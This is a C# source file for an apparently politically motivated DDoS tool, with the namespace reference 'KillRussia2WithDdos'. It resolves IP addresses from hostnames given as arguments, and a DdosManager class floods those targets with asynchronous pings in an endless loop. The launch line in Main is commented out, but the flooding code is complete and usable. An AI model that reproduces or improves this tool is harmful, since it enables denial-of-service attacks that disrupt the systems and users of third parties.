using System;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using KillRussia2WithDdos;

namespace HttpIdeadDdosProgram
{
    class Program
    {
        static List<string> ipaddresses = new();
        static void Main(string[] args)
        {
            int threads = int.Parse(args[0]);

            for (int i = 1; i < args.Length; i++)
            {
                foreach (var item in FindIp.FindIpAddresses(args[i]))
                {
                    ipaddresses.Add(item.ToString());
                }
            }
            foreach (var item in ipaddresses)
            {
                Console.WriteLine(item);
                //DdosManager.Launch(threads, item);
            }

            Console.ReadKey();
        }
    }
    class DdosManager
    {
        public static List<DdosGoAhead> list = new();
        public static void Launch(int quantity, string url)
        {
            try
            {
                for (int i = 0; i < quantity; i++)
                {
                    list.Add(new DdosGoAhead());
                }
                while (true)
                {
                    list.ForEach(async x =>
                    {
                        await x.SendRequest(url);
                    });
                    //System.Threading.Thread.Sleep(31000);
                    if (DdosGoAhead.numerator % 1000 == 0)
                    {
                        GC.Collect();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
    }
    class DdosGoAhead
    {
        public static long numerator = default;
        public async Task SendRequest(string ip)
        {
            //begin:
            try
            {

                Ping ping = new();
                PingOptions options = new PingOptions(10, true);
                byte[] data = Encoding.ASCII.GetBytes("Russkiy korabl didi nahui");
                PingReply reply = await ping.SendPingAsync(ip, 30, data, options);
                Console.WriteLine(ip + " Status-> " + reply.Status);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                //goto begin;
            }

        }
    }
}
